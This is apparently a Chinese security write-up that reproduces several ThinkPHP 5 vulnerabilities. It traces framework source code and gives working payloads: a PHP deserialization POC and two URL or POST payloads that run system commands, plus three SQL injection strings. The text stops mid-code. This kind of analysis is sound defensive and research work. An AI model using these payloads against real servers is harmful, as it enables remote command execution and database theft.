# ThinkPHP V5 漏洞复现

阅读量 **347290**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-09-22 16:30:02

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t0154d6578d8f830dea.jpg)

## 0x00 ThinkPHP V5.1反序列化

###  0x00 项目安装

使用composer部署TP项目,创建一个名为TP51的TP项目  
`composer create-project --prefer-dist topthink/think tp51 5.1.*`

TP框架入口文件为{安装目录}/public/index.php，使用apache部署后访问入口文件显示TP欢迎界面即安装成功。

###  0x01 演示版本

ThinkPHP v5.1.41  
PHP: php 7.3.4  
OS：Windows10

###  0x02 源码分析

**准备**

首先得准备一个反序列化的入口  
可以直接在 `public/index.php` 中添加如下代码对输入进行反序列化

    
    
    if (isset($_GET['data'])) {
        $data=$_GET['data'];
        unserialize(base64_decode($data));
    } else {
        highlight_file(__FILE__);
    }
    

**分析**

起始位置在 `think\process\pipes\Windows` 类的 `__destruct()` 方法内调用的
`$this->removeFiles()`。

    
    
    public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }
    

该函数的作用是删除文件，但是这里用来判断文件是否存在的函数 `file_exists()` 的参数如果是一个对象，会触发它的 `__toString()`
方法。

    
    
    private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
    

这里可以利用 `think\model\concern\Conversion` 类，但是这是一个trait，不能实例化，所以还要找一个使用了它的类，如
`think\Model` ，但这是一个抽象类，所以又接着找到了它的实现类
`think\model\Pivot`。解决了trait的问题，那就接着跟进调用的函数 `toJson()`，接着调用 `toArray()`。

    
    
    public function __toString()
    {
        return $this->toJson();
    }
    
    public function toJson($options = JSON_UNESCAPED_UNICODE)
    {
        return json_encode($this->toArray(), $options);
    }
    

`toArray()` 截图了关键代码，这里的 `$this->append` 可控。

    
    
    if (!empty($this->append)) {
        foreach ($this->append as $key => $name) {
            if (is_array($name)) {
                // 追加关联对象属性
                $relation = $this->getRelation($key);
    
                if (!$relation) {
                    $relation = $this->getAttr($key);
                    if ($relation) {
                        $relation->visible($name);
                    }
                }
    
                $item[$key] = $relation ? $relation->append($name)->toArray() : [];
            }
        }
    }
    

定位到 `getRelation()` ，只要使得 `$this->getRelation($key)` 返回值为False，就接着调用
`$this->getAttr($key)`。

    
    
    public function getRelation($name = null)
    {
        if (is_null($name)) {
            return $this->relation;
        } elseif (array_key_exists($name, $this->relation)) {
            return $this->relation[$name];
        }
        return;
    }
    

截取前面部分代码，这里的 `$closure($value, $this->data)` ，如果 `$closure` 和 `$value`
可控的话，那么我们就可以执行任意命令。

`$closure = $this->withAttr[$fieldName];` ，调用的函数名由 `$this->withAttr` 以及
`$fieldName` 决定，`$this->withAttr` 可控，而 `$fieldName` 由 `$this->append`
的键名决定。函数定了，参数 `$value` 回溯看一下，等于 `$this->getData($name)`

    
    
    public function getAttr($name, &$item = null)
    {
        try {
            $notFound = false;
            $value    = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $notFound = true;
            $value    = null;
        }
    
        // 检测属性获取器
        $fieldName = Loader::parseName($name);
        $method    = 'get' . Loader::parseName($name, 1) . 'Attr';
    
        if (isset($this->withAttr[$fieldName])) {
            if ($notFound && $relation = $this->isRelationAttr($name)) {
                $modelRelation = $this->$relation();
                $value         = $this->getRelationData($modelRelation);
            }
    
            $closure = $this->withAttr[$fieldName];
            $value   = $closure($value, $this->data);
        }
    }
    

函数的返回值可以由 `$this->data[$name]` 决定，也是可控。

    
    
    public function getData($name = null)
    {
        if (is_null($name)) {
            return $this->data;
        } elseif (array_key_exists($name, $this->data)) {
            return $this->data[$name];
        } elseif (array_key_exists($name, $this->relation)) {
            return $this->relation[$name];
        }
        throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
    }
    

那么就可以写出POC了

    
    
    <?php
    
    namespace think\process\pipes{
    
        use think\model\Pivot;
    
        class Windows
        {
            private $files = [];
            public function __construct()
            {
                $this->files=[new Pivot()];
            }
        }
    }
    
    namespace think\model{
        use think\Model;
    
        class Pivot extends Model
        {
        }
    }
    
    namespace think{
        abstract class Model
        {
            private $data = [];
            private $withAttr = [];
            protected $append = ['so4ms'=>[]];
    
            public function __construct()
            {
                $this->relation = false;
                $this->data = ['so4ms'=>'whoami'];
                $this->withAttr = ['so4ms'=>'system'];
            }
        }
    }
    
    namespace {
        use think\process\pipes\Windows;
    
        $windows = new Windows();
        echo base64_encode(serialize($windows))."\n";
    }
    

## 0x01 ThinkPHP5 未开启强制路由RCE

###  0x00 影响范围

> ThinkPHP 5.0.5-5.0.22  
>  ThinkPHP 5.1.0-5.1.30

###  0x01 演示版本

ThinkPHP v5.0.15  
PHP: php 7.3.4  
环境：Windows10

###  0x02 payload

调试分析时选用的是
`?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami`

###  0x03 触发条件

`application\config.php` 两个所需条件如下：

    
    
    // PATHINFO变量名 用于兼容模式
    'var_pathinfo'           => 's',
    // 是否强制使用路由
    'url_route_must'         => false,
    

###  0x04 调试分析

入口函数 `think\App` 中的 `run()` 函数，在 `routeCheck()` 处打下断点，跟进。

    
    
    // 未设置调度信息则进行 URL 路由检测
    if (empty($dispatch)) {
        $dispatch = self::routeCheck($request, $config);
    }
    

在 `routeCheck()` 中先调用了 `path()` 函数来获取路由，跟进一下 `path()` 函数。

    
    
    $path   = $request->path();
    

又接着跟进 `$this->pathinfo()`

    
    
    $pathinfo = $this->pathinfo();
    

此时的 `$this->pathinfo` 默认为null，进入if，然后开始获取 `config.php` 中的设置 `'var_pathinfo'`
，因此之前得有 `'var_pathinfo' => 's',` 才能进一步往下。然后通过
`$_GET[Config::get('var_pathinfo')]` 获取我们传入的路由信息。

此时进入下一个if，由于上面已经获取了 `$_SERVER['PATH_INFO']` ，不满足条件，所以跳过了这个if。返回
`index/\think\app/invokefunction`。

    
    
    public function pathinfo()
    {
        if (is_null($this->pathinfo)) {
            if (isset($_GET[Config::get('var_pathinfo')])) {
                // 判断URL里面是否有兼容模式参数
                $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')];
                unset($_GET[Config::get('var_pathinfo')]);
            } elseif (IS_CLI) {
                // CLI模式下 index.php module/controller/action/params/...
                $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : '';
            }
    
            // 分析PATHINFO信息
            if (!isset($_SERVER['PATH_INFO'])) {
                foreach (Config::get('pathinfo_fetch') as $type) {
                    if (!empty($_SERVER[$type])) {
                        $_SERVER['PATH_INFO'] = (0 === strpos($_SERVER[$type], $_SERVER['SCRIPT_NAME'])) ?
                            substr($_SERVER[$type], strlen($_SERVER['SCRIPT_NAME'])) : $_SERVER[$type];
                        break;
                    }
                }
            }
            $this->pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/');
        }
        return $this->pathinfo;
    }
    

回到 `path()` 函数，这里的 `$suffix` 值默认为 `html` ，进入第一个 elseif。去掉 `html`
，由于我们的请求中没有，所以没任何影响，返回 `index/\think\app/invokefunction`。

    
    
    public function path()
    {
        if (is_null($this->path)) {
            $suffix   = Config::get('url_html_suffix');
            $pathinfo = $this->pathinfo();
            if (false === $suffix) {
                // 禁止伪静态访问
                $this->path = $pathinfo;
            } elseif ($suffix) {
                // 去除正常的URL后缀
                $this->path = preg_replace('/\.(' . ltrim($suffix, '.') . ')$/i', '', $pathinfo);
            } else {
                // 允许任何后缀访问
                $this->path = preg_replace('/\.' . $this->ext() . '$/i', '', $pathinfo);
            }
        }
        return $this->path;
    }
    

回到 `routeCheck()`，这里先对路由进行了检测，返回为false，然后对 `config.php` 中的 `url_route_must`
进行了判断，之前已经确认了为false，不开启强制路由，否则的话下面就会抛出错误，也就无法继续利用了。

    
    
    // 路由检测（根据路由定义返回不同的URL调度）
    $result = Route::check($request, $path, $depr, $config['url_domain_deploy']);
    $must   = !is_null(self::$routeMust) ? self::$routeMust : $config['url_route_must'];
    

然后在下面，由于 `$result` 值为false，所以调用了 `parseUrl` 来对输入进行解析。

    
    
    // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索
    if (false === $result) {
        $result = Route::parseUrl($path, $depr, $config['controller_auto_search']);
    }
    

这里url的 `/` 被替换为了 `|` ，然后我们跟进 `parseUrlPath()`。

    
    
    $url              = str_replace($depr, '|', $url);
    list($path, $var) = self::parseUrlPath($url);
    

这里又把 `|` 换回了 `/` ，然后根据 `/` 将url切割为了三部分：模块/控制器/操作。

    
    
    /**
     * 解析URL的pathinfo参数和变量
     * @access private
     * @param string    $url URL地址
     * @return array
     */
    private static function parseUrlPath($url)
    {
        // 分隔符替换 确保路由定义使用统一的分隔符
        $url = str_replace('|', '/', $url);
        $url = trim($url, '/');
        $var = [];
        if (false !== strpos($url, '?')) {
            // [模块/控制器/操作?]参数1=值1&参数2=值2...
            $info = parse_url($url);
            $path = explode('/', $info['path']);
            parse_str($info['query'], $var);
        } elseif (strpos($url, '/')) {
            // [模块/控制器/操作]
            $path = explode('/', $url);
        } else {
            $path = [$url];
        }
        return [$path, $var];
    }
    

然后回到 `parseUrl` ，然后分别获取模块、控制器、操作，最后返回了 `['type' => 'module', 'module' =>
$route]`。

    
    
    public static function parseUrl($url, $depr = '/', $autoSearch = false)
    {
    
        if (isset(self::$bind['module'])) {
            $bind = str_replace('/', $depr, self::$bind['module']);
            // 如果有模块/控制器绑定
            $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr);
        }
        $url              = str_replace($depr, '|', $url);
        list($path, $var) = self::parseUrlPath($url);
        $route            = [null, null, null];
        if (isset($path)) {
            // 解析模块
            $module = Config::get('app_multi_module') ? array_shift($path) : null;
            if ($autoSearch) {
                // 自动搜索控制器
                // 不执行，省略了
            } else {
                // 解析控制器
                $controller = !empty($path) ? array_shift($path) : null;
            }
            // 解析操作
            $action = !empty($path) ? array_shift($path) : null;
            // 解析额外参数
            self::parseUrlParams(empty($path) ? '' : implode('|', $path));
            // 封装路由
            $route = [$module, $controller, $action];
            // 检查地址是否被定义过路由
            $name  = strtolower($module . '/' . Loader::parseName($controller, 1) . '/' . $action);
            $name2 = '';
            if (empty($module) || isset($bind) && $module == $bind) {
                $name2 = strtolower(Loader::parseName($controller, 1) . '/' . $action);
            }
    
            if (isset(self::$rules['name'][$name]) || isset(self::$rules['name'][$name2])) {
                throw new HttpException(404, 'invalid request:' . str_replace('|', $depr, $url));
            }
        }
        return ['type' => 'module', 'module' => $route];
    }
    

回到了最开始的 `run()` ，往下执行到 `$data = self::exec($dispatch, $config);`，`$dispatch`
就是上面我们返回的 `['type' => 'module', 'module' => $route]`。执行如下代码。

    
    
    case 'module': // 模块/控制器/操作
        $data = self::module(
            $dispatch['module'],
            $config,
            isset($dispatch['convert']) ? $dispatch['convert'] : null
        );
        break;
    

最后在 `module()` 的最后 `return self::invokeMethod($call, $vars);`，这里的 `$call`
就是我们传入的控制器、操作。

在这生成反射实例，然后在 `bindParams` 获取了我们传入的参数
`function=call_user_func_array&vars[0]=system&vars[1][]=whoami`

    
    
    public static function invokeMethod($method, $vars = [])
    {
        if (is_array($method)) {
            $class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);
            $reflect = new \ReflectionMethod($class, $method[1]);
        } else {
            // 静态方法
            $reflect = new \ReflectionMethod($method);
        }
    
        $args = self::bindParams($reflect, $vars);
    
        self::$debug && Log::record('[ RUN ] ' . $reflect->class . '->' . $reflect->name . '[ ' . $reflect->getFileName() . ' ]', 'info');
    
        return $reflect->invokeArgs(isset($class) ? $class : null, $args);
    }
    

最后就到达了我们的目的地 `invokeFunction()`，成功rce。

    
    
    public static function invokeFunction($function, $vars = [])
    {
        $reflect = new \ReflectionFunction($function);
        $args    = self::bindParams($reflect, $vars);
    
        // 记录执行信息
        self::$debug && Log::record('[ RUN ] ' . $reflect->__toString(), 'info');
    
        return $reflect->invokeArgs($args);
    }
    

## 0x02 ThinkPHP v5.0 命令执行

###  0x00 影响范围

> ThinkPHP 5.0.0 ~ ThinkPHP 5.0.23

###  0x01 演示版本

ThinkPHP v5.0.15  
PHP: php 7.3.4  
OS：Windows10

###  0x02 漏洞复现

向网页进行POST传参 `_method=__construct&filter=system&a=whoami` ，可以发现成功执行命令。

###  0x03 触发条件

`Application/config.php` 开启调试。

    
    
    // 应用调试模式
    'app_debug' => true,
    

###  0x04 调试分析

由于漏洞出现在参数过滤处，所以我们在 `Think\App.php` 的 `run()` 函数里打下断点

    
    
    $request->filter($config['default_filter']);
    

这里获取了全局过滤方法，默认为空字符。

    
    
    // 默认全局过滤方法 用逗号分隔多个
    'default_filter'         => '',
    

跟进 `filter()` ，这里传入的 `$filter` 不为null，所以进入else。

    
    
    /**
     * 设置或获取当前的过滤规则
     * @param mixed $filter 过滤规则
     * @return mixed
     */
    public function filter($filter = null)
    {
        if (is_null($filter)) {
            return $this->filter;
        } else {
            $this->filter = $filter;
        }
    }
    

随后 `run()` 函数执行到 `routeCheck()`。

    
    
    if (empty($dispatch)) {
        $dispatch = self::routeCheck($request, $config);
    }
    

在 `routeCheck()` 中调用了 `check()` ，又接着调用了 `method()`。

获取 `config.php` 中的 `var_method`，默认为
`_method`，由于我们传入了`_method=__construct`，这里进入elseif，就使得
`$this->method=__construct`，随后就调用了 `__construct()`，将我们POST传递的参数当做函数参数传入。

    
    
    public function method($method = false)
    {
        if (true === $method) {
            // 获取原始请求类型
            return IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
        } elseif (!$this->method) {
            if (isset($_POST[Config::get('var_method')])) {
                $this->method = strtoupper($_POST[Config::get('var_method')]);
                $this->{$this->method}($_POST);
            } elseif (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) {
                $this->method = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']);
            } else {
                $this->method = IS_CLI ? 'GET' : (isset($this->server['REQUEST_METHOD']) ? $this->server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']);
            }
        }
        return $this->method;
    }
    

这里对传入的参数进行了遍历，由于 `Request` 类存在 `filter` 属性，所以就将我们的输入覆盖了原来的 `filter` 。

    
    
    protected function __construct($options = [])
    {
        foreach ($options as $name => $item) {
            if (property_exists($this, $name)) {
                $this->$name = $item;
            }
        }
        if (is_null($this->filter)) {
            $this->filter = Config::get('default_filter');
        }
    
        // 保存 php://input
        $this->input = file_get_contents('php://input');
    }
    

又回到 `run()` ，这里会判断是否开启了debug，开启的话就会调用 `$request->param()` ，来记录参数信息。

    
    
    // 记录路由和请求信息
    if (self::$debug) {
        Log::record('[ ROUTE ] ' . var_export($dispatch, true), 'info');
        Log::record('[ HEADER ] ' . var_export($request->header(), true), 'info');
        Log::record('[ PARAM ] ' . var_export($request->param(), true), 'info');
    }
    

调用 `$this->post` 来获取传递的参数，然后进入 `input()`。

    
    
    public function param($name = '', $default = null, $filter = '')
    {
        if (empty($this->param)) {
            $method = $this->method(true);
            // 自动获取请求变量
            switch ($method) {
                case 'POST':
                    $vars = $this->post(false);
                    break;
                case 'PUT':
                case 'DELETE':
                case 'PATCH':
                    $vars = $this->put(false);
                    break;
                default:
                    $vars = [];
            }
            // 当前请求参数和URL地址中的参数合并
            $this->param = array_merge($this->get(false), $vars, $this->route(false));
        }
        if (true === $name) {
            // 获取包含文件上传信息的数组
            $file = $this->file();
            $data = is_array($file) ? array_merge($this->param, $file) : $this->param;
            return $this->input($data, '', $default, $filter);
        }
        return $this->input($this->param, $name, $default, $filter);
    }
    

随后执行 `$filter = $this->getFilter($filter, $default);` 调用 `$this->getFilter`
来解析获取过滤器，也就是我们之前覆盖为了 `system` 的 `filter`。

进入 `filterValue()` ，调用了 `$value = call_user_func($filter, $value);` ，`$filter`
就是 `system` ，`$value` 就是我们传入的参数的值，成功执行命令。

    
    
    private function filterValue(&$value, $key, $filters)
    {
        $default = array_pop($filters);
        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            } elseif (is_scalar($value)) {
                if (false !== strpos($filter, '/')) {
                    // 正则过滤
                    if (!preg_match($filter, $value)) {
                        // 匹配不成功返回默认值
                        $value = $default;
                        break;
                    }
                } elseif (!empty($filter)) {
                    // filter函数不存在时, 则使用filter_var进行过滤
                    // filter为非整形值时, 调用filter_id取得过滤id
                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                    if (false === $value) {
                        $value = $default;
                        break;
                    }
                }
            }
        }
        return $this->filterExp($value);
    }
    

## 0x03 ThinkPHP v5.0.15 SQL注入

###  0x00 影响范围

> ThinkPHP 5.0.13-5.0.15

###  0x01 演示版本

ThinkPHP v5.0.15  
PHP: php 7.3.4  
环境：Windows10

###  0x02 payload

`?username[0]=inc&username[1]=updatexml(1,concat(0x7e,database(),0x7e),1)&username[2]=1`

###  0x03 触发条件

报错注入需要开启debug模式

    
    
    // 应用调试模式
    'app_debug' => true,
    

添加一个路由进行insert。这里 `get('username/a')` 以数组的格式获取username，或者以全局数组
`$_GET['username']` 来获取参数。

    
    
    public function sql()
    {
        $username = request()->get('username/a');
        db('user')->insert(['username' => $username,'password'=>'password']);
        return 'Update success';
    }
    

###  0x04 调试分析

首先进入 `insert()` 函数，然后调用 `$sql = $this->builder->insert($data, $options,
$replace);` 来生成SQL语句。随后调用 `$this->parseData()` ，漏洞就出现在这。

    
    
    // 分析并处理数据
    $data = $this->parseData($data, $options);
    

先获取了表的字段名，然后逐个对要插入的数据进行判断，这里就是关键了，如果我们传入的不是数组，而是一个字符串的话，就会进入 `elseif
(is_scalar($val))`，如果传入的是数组的话就进入的是 `elseif (is_array($val) && !empty($val))`。

    
    
    protected function parseData($data, $options)
    {
        if (empty($data)) {
            return [];
        }
    
        // 获取绑定信息
        $bind = $this->query->getFieldsBind($options['table']);
        if ('*' == $options['field']) {
            $fields = array_keys($bind);
        } else {
            $fields = $options['field'];
        }
    
        $result = [];
        foreach ($data as $key => $val) {
            $item = $this->parseKey($key, $options);
            if (is_object($val) && method_exists($val, '__toString')) {
                // 对象数据写入
                $val = $val->__toString();
            }
            if (false === strpos($key, '.') && !in_array($key, $fields, true)) {
                if ($options['strict']) {
                    throw new Exception('fields not exists:[' . $key . ']');
                }
            } elseif (is_null($val)) {
                $result[$item] = 'NULL';
            } elseif (is_array($val) && !empty($val)) {
                switch ($val[0]) {
                    case 'exp':
                        $result[$item] = $val[1];
                        break;
                    case 'inc':
                        $result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
                        break;
                    case 'dec':
                        $result[$item] = $this->parseKey($val[1]) . '-' . floatval($val[2]);
                        break;
                }
            } elseif (is_scalar($val)) {
                // 过滤非标量数据
                if (0 === strpos($val, ':') && $this->query->isBind(substr($val, 1))) {
                    $result[$item] = $val;
                } else {
                    $key = str_replace('.', '_', $key);
                    $this->query->bind('data__' . $key, $val, isset($bind[$key]) ? $bind[$key] : PDO::PARAM_STR);
                    $result[$item] = ':data__' . $key;
                }
            }
        }
        return $result;
    }
    

先来看看传入字符串的时候，该函数会返回一个数组，不会将字符串直接插入，我们接着往下看。

    
    
    `username`:":data__username"
    `password`:":data__password"
    

回到 `insert()`，我们拿到了一个初始的SQL语句 `"INSERT INTO `user` (`username` , `password`)
VALUES (:data__username , :data__password) "`

调用 `$result = 0 === $sql ? 0 : $this->execute($sql, $bind);`，调试跟进，又接着调用
`$this->connection->execute($sql, $bind);`。

然后通过以下语句进行参数绑定，然后执行语句，使用的是PDO预编译，肯定是无法进行注入的。

    
    
    // 预处理
    if (empty($this->PDOStatement)) {
        $this->PDOStatement = $this->linkID->prepare($sql);
    }
    // 是否为存储过程调用
    $procedure = in_array(strtolower(substr(trim($sql), 0, 4)), ['call', 'exec']);
    // 参数绑定
    if ($procedure) {
        $this->bindParam($bind);
    } else {
        $this->bindValue($bind);
    }
    // 执行语句
    $this->PDOStatement->execute();
    // 调试结束
    $this->debug(false);
    

回到之前，如果我们传入的是数组，然后进入 `elseif (is_array($val) && !empty($val))`。

这里会判断 `$val[0]`，前面如果采用的是 `$_GET['username']` 来获取参数，那么三个分支都可以用来SQL注入，但是如果用的
`request()->get('username/a')` 来获取参数，那么 `exp` 会被过滤为 `exp`，这里就不去调试了。所以我们可以选用
`inc` 或者 `dec` ，传入 `username[0]=inc`。然后会将 `$val[1]` 与 `$val[2]` 拼接起来，赋值给
`$result[$item]` ，这就意味着不会产生之前的
``username`:":data__username"`，而是将我们的输入直接拼接到SQL语句中，这样，返回的SQL语句就变为了 `"INSERT
INTO `user` (`username` , `password`) VALUES
(updatexml(1,concat(0x7e,database(),0x7e),1)+1 , :data__password) "`，成功注入。

    
    
    elseif (is_array($val) && !empty($val)) {
        switch ($val[0]) {
            case 'exp':
                $result[$item] = $val[1];
                break;
            case 'inc':
                $result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
                break;
            case 'dec':
                $result[$item] = $this->parseKey($val[1]) . '-' . floatval($val[2]);
                break;
        }
    }
    

## 0x04 ThinkPHP v5.0.15 SQL注入

###  0x00 影响范围

> ThinkPHP 5.1.6-5.1.7

###  0x01 演示版本

ThinkPHP v5.1.6  
PHP: php 7.3.4  
环境：Windows10

###  0x02 payload

`?username[0]=point&username[1]=0x7e,database(),0x7e),'1&username[2]=updatexml&username[3]=1',concat`

###  0x03 触发条件

报错注入需要开启debug模式

    
    
    // 应用调试模式
    'app_debug' => true,
    

添加一个路由进行insert。这里 `get('username/a')` 以数组的格式获取username，或者以全局数组
`$_GET['username']` 来获取参数。

    
    
    public function sql()
    {
        $username = request()->get('username/a');
        db('user')->where(['id' => 1])->update(['username' => $username]);
    }
    

###  0x04 调试分析

调用 `update()` 后接着调用 `$this->connection->update($this)`。

然后又调用 `$this->builder->update($query);` 生成UPDATE SQL语句，跟进。

接着我们又看到了熟悉的 `parseData()`，跟进看一下。

    
    
        public function update(Query $query)
        {
            $options = $query->getOptions();
    
            $table = $this->parseTable($query, $options['table']);
            $data  = $this->parseData($query, $options['data']);
            ......
        }
    

还是同样的先获取表的字段名，然后逐个对要插入的数据进行判断，如果传入的是字符串进入 `elseif
(is_scalar($val))`，传入的是数组的话进入 `elseif (is_array($val) &&
!empty($val))`。传入字符串的话还是和之前一样是预编译，不能进行注入，我们就直接来看传入数组的情况。

    
    
    protected function parseData(Query $query, $data = [], $fields = [], $bind = [], $suffix = '')
    {
        if (empty($data)) {
            return [];
        }
    
        $options = $query->getOptions();
    
        // 获取绑定信息
        if (empty($bind)) {
            $bind = $this->connection->getFieldsBind($options['table']);
        }
    
        if (empty($fields)) {
            if ('*' == $options['field']) {
                $fields = array_keys($bind);
            } else {
                $fields = $options['field'];
            }
        }
    
        $result = [];
    
        foreach ($data as $key => $val) {
            $item = $this->parseKey($query, $key);
    
            if ($val instanceof Expression) {
                $result[$item] = $val->getValue();
                continue;
            } elseif (!is_scalar($val) && (in_array($key, (array) $query->getOptions('json')) || 'json' == $this->connection->getFieldsType($options['table'], $key))) {
                $val = json_encode($val);
            } elseif (is_object($val) && method_exists($val, '__toString')) {
                // 对象数据写入
                $val = $val->__toString();
            }
    
            if (false !== strpos($key, '->')) {
                list($key, $name) = explode('->', $key);
                $item             = $this->parseKey($query, $key);
                $result[$item]    = 'json_set(' . $item . ', \'$.' . $name . '\', ' . $this->parseDataBind($query, $key, $val, $bind, $suffix) . ')';
            } elseif (false === strpos($key, '.') && !in_array($key, $fields, true)) {
                if ($options['strict']) {
                    throw new Exception('fields not exists:[' . $key . ']');
                }
            } elseif (is_null($val)) {
                $result[$item] = 'NULL';
            } elseif (is_array($val) && !empty($val)) {
                switch ($val[0]) {
                    case 'INC':
                        $result[$item] = $item . ' + ' . floatval($val[1]);
                        break;
                    case 'DEC':
                        $result[$item] = $item . ' - ' . floatval($val[1]);
                        break;
                    default:
                        $value = $this->parseArrayData($query, $val);
                        if ($value) {
                            $result[$item] = $value;
                        }
                }
            } elseif (is_scalar($val)) {
                // 过滤非标量数据
                $result[$item] = $this->parseDataBind($query, $key, $val, $bind, $suffix);
            }
        }
    
        return $result;
    }
    

不同于之前的是，这次在前两个分支中，进行拼接的是 `floatval($val[1])`，而不是直接将字符串进行拼接，显然是无法进行利用了，那我们来看看
`parseArrayData()`。

    
    
    elseif (is_array($val) && !empty($val)) {
        switch ($val[0]) {
            case 'INC':
                $result[$item] = $item . ' + ' . floatval($val[1]);
                break;
            case 'DEC':
                $result[$item] = $item . ' - ' . floatval($val[1]);
                break;
            default:
                $value = $this->parseArrayData($query, $val);
                if ($value) {
                    $result[$item] = $value;
                }
        }
    }
    

这里 `$type` 是数组的第一个值，`$value` 是数组的第二个值。这里让 `$type`
等于point，进入第一个分支。然后分别获取数组下标为2和下标为3的值。然后以 `$data[2] . '(\'' . $data[3] . '(' .
$data[1] . ')\')'` 的样式拼接起来，返回该值。随后将其拼接到SQL语句中，`"UPDATE `user` SET `username` =
updatexml('1',concat(0x7e,database(),0x7e),'1)') WHERE `id` = :where_AND_id
"`，注入成功。

    
    
    protected function parseArrayData(Query $query, $data)
    {
        list($type, $value) = $data;
    
        switch (strtolower($type)) {
            case 'point':
                $fun   = isset($data[2]) ? $data[2] : 'GeomFromText';
                $point = isset($data[3]) ? $data[3] : 'POINT';
                if (is_array($value)) {
                    $value = implode(' ', $value);
                }
                $result = $fun . '(\'' . $point . '(' . $value . ')\')';
                break;
            default:
                $result = false;
        }
    
        return $result;
    }
    

## 0x05 ThinkPHP v5.0.10 SQL注入

###  0x00 影响范围

> > =ThinkPHP 5.0.10

###  0x01 演示版本

ThinkPHP v5.0.10  
PHP: php 7.3.4  
环境：Windows10

###  0x02 payload

`?username[0]=NOT LIKE&username[1][0]=%&username[1][1]=So4ms&username[2]=)
union select 1,114514,database()%23`

###  0x03 触发条件

添加一个路由进行insert。这里 `get('username/a')` 以数组的格式获取username，或者以全局数组
`$_GET['username']` 来获取参数。

    
    
    public function sql()
    {
        $username = request()->get('username/a');
        $result = db('user')->where(['username' => $username])->select();
        print_r($result);
    }
    

###  0x04 调试分析

先调用 `select()` ，然后在其中调用 `$this->builder->select($options);`，生成查询SQL语句。然后调用
`$this->parseWhere($options['where'], $options),` ，跟进，又调用了 `parseWhereItem()`
处理查询条件。

    
    
    protected function parseWhereItem($field, $val, $rule = '', $options = [], $binds = [], $bindName = null)
    {
        // 字段分析
        $key = $field ? $this->parseKey($field, $options) : '';
    
        // 查询规则和条件
        if (!is_array($val)) {
            $val = ['=', $val];
        }
        list($exp, $value) = $val;
    
        // 对一个字段使用多个查询条件
        if (is_array($exp)) {
            $item = array_pop($val);
            // 传入 or 或者 and
            if (is_string($item) && in_array($item, ['AND', 'and', 'OR', 'or'])) {
                $rule = $item;
            } else {
                array_push($val, $item);
            }
            foreach ($val as $k => $item) {
                $bindName = 'where_' . str_replace('.', '_', $field) . '_' . $k;
                $str[]    = $this->parseWhereItem($field, $item, $rule, $options, $binds, $bindName);
            }
            return '( ' . implode(' ' . $rule . ' ', $str) . ' )';
        }
    
        // 检测操作符
        if (!in_array($exp, $this->exp)) {
            $exp = strtolower($exp);
            if (isset($this->exp[$exp])) {
                $exp = $this->exp[$exp];
            } else {
                throw new Exception('where express error:' . $exp);
            }
        }
        $bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);
        if (preg_match('/\W/', $bindName)) {
            // 处理带非单词字符的字段名
            $bindName = md5($bindName);
        }
    
        $bindType = isset($binds[$field]) ? $binds[$field] : PDO::PARAM_STR;
        if (is_scalar($value) && array_key_exists($field, $binds) && !in_array($exp, ['EXP', 'NOT NULL', 'NULL', 'IN', 'NOT IN', 'BETWEEN', 'NOT BETWEEN']) && strpos($exp, 'TIME') === false) {
            if (strpos($value, ':') !== 0 || !$this->query->isBind(substr($value, 1))) {
                if ($this->query->isBind($bindName)) {
                    $bindName .= '_' . str_replace('.', '_', uniqid('', true));
                }
                $this->query->bind($bindName, $value, $bindType);
                $value = ':' . $bindName;
            }
        }
    
        $whereStr = '';
        if (in_array($exp, ['=', '<>', '>', '>=', '<', '<='])) {
            // 比较运算
            if ($value instanceof \Closure) {
                $whereStr .= $key . ' ' . $exp . ' ' . $this->parseClosure($value);
            } else {
                $whereStr .= $key . ' ' . $exp . ' ' . $this->parseValue($value, $field);
            }
        } elseif ('LIKE' == $exp || 'NOT LIKE' == $exp) {
            // 模糊匹配
            if (is_array($value)) {
                foreach ($value as $item) {
                    $array[] = $key . ' ' . $exp . ' ' . $this->parseValue($item, $field);
                }
                $logic = isset($val[2]) ? $val[2] : 'AND';
                $whereStr .= '(' . implode($array, ' ' . strtoupper($logic) . ' ') . ')';
            } else {
                $whereStr .= $key . ' ' . $exp . ' ' . $this->parseValue($value, $field);
            }
        } elseif ('EXP' == $exp) {
            // 表达式查询
            $whereStr .= '( ' . $key . ' ' . $value . ' )';
        } elseif (in_array($exp, ['NOT NULL', 'NULL'])) {
            // NULL 查询
            $whereStr .= $key . ' IS ' . $exp;
        } elseif (in_array($exp, ['NOT IN', 'IN'])) {
            // IN 查询
            if ($value instanceof \Closure) {
                $whereStr .= $key . ' ' . $exp . ' ' . $this->parseClosure($value);
            } else {
                $value = array_unique(is_array($value) ? $value : explode(',', $value));
                if (array_key_exists($field, $binds)) {
                    $bind  = [];
                    $array = [];
                    $i     = 0;
                    foreach ($value as $v) {
                        $i++;
                        if ($this->query->isBind($bindName . '_in_' . $i)) {
                            $bindKey = $bindName . '_in_' . uniqid() . '_' . $i;
                        } else {
